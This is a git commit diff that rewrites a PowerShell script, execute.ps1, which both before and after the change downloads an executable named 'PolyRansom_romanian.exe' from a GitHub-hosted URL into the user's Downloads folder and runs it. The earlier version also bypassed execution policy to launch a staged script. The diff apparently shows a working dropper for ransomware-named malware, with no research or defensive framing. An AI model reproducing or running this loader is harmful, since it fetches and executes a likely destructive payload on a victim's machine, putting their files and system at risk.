68eb2d4e4f787ead844c0359df4e3dba6b9596cb
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-06 10:47:35 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,18 +1,10 @@
-$scriptContent = @"
-\$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
-\$downloadPath = Join-Path \$env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
-\$webClient = New-Object System.Net.WebClient
-\$webClient.DownloadFile(\$url, \$downloadPath)
-if (Test-Path \$downloadPath) {
-    Start-Process -FilePath \$downloadPath -Wait
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
+$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $downloadPath)
+if (Test-Path $downloadPath) {
+    Start-Process -FilePath $downloadPath -Wait
     exit
 } else {
-    Write-Host "Download failed."
+
 }
-"@
-
-$scriptPath = Join-Path $env:USERPROFILE "Downloads\download_and_run.ps1"
-
-$scriptContent | Out-File -FilePath $scriptPath -Encoding ascii
-
-Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
